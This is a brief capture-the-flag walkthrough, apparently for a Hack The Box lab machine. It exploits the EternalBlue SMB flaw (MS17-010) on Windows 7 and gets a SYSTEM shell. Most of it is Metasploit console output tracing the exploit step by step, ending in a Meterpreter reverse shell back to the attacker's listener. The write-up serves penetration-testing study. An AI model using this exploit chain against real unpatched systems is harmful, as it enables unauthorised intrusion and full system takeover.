# Summary
- User: EternalBlue exploit allows you to achieve reverse shell as `nt authority\system`
- Root: see above

# Details
### User
- scan reveals ports 135, 139, 445
- due to name of box and open ports, box is likely vulnerable to EternalBlue (CVE-2017-0144 / MS17-010)
- EternalBlue exploit (through Metasploit or Python script) allows direct escalation to `nt authority\system`
- https://research.checkpoint.com/2017/eternalblue-everything-know/
- https://www.youtube.com/watch?v=HsievGJQG0w

### Root
- see above

```
[*] Started reverse TCP handler on 10.10.14.114:9999 
[*] 10.129.147.245:445 - Executing automatic check (disable AutoCheck to override)
[*] 10.129.147.245:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.147.245:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.147.245:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.147.245:445 - The target is vulnerable.
[*] 10.129.147.245:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.147.245:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.147.245:445    - Scanned 1 of 1 hosts (100% complete)
[*] 10.129.147.245:445 - Connecting to target for exploitation.
[+] 10.129.147.245:445 - Connection established for exploitation.
[+] 10.129.147.245:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.147.245:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.147.245:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.147.245:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.147.245:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.147.245:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.147.245:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.147.245:445 - Sending all but last fragment of exploit packet
[*] 10.129.147.245:445 - Starting non-paged pool grooming
[+] 10.129.147.245:445 - Sending SMBv2 buffers
[+] 10.129.147.245:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.147.245:445 - Sending final SMBv2 buffers.
[*] 10.129.147.245:445 - Sending last fragment of exploit packet!
[*] 10.129.147.245:445 - Receiving response from exploit packet
[+] 10.129.147.245:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.147.245:445 - Sending egg to corrupted connection.
[*] 10.129.147.245:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.129.147.245
[*] Meterpreter session 1 opened (10.10.14.114:9999 -> 10.129.147.245:49158) at 2021-05-17 14:04:58 -0400
[+] 10.129.147.245:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.147.245:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.147.245:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```
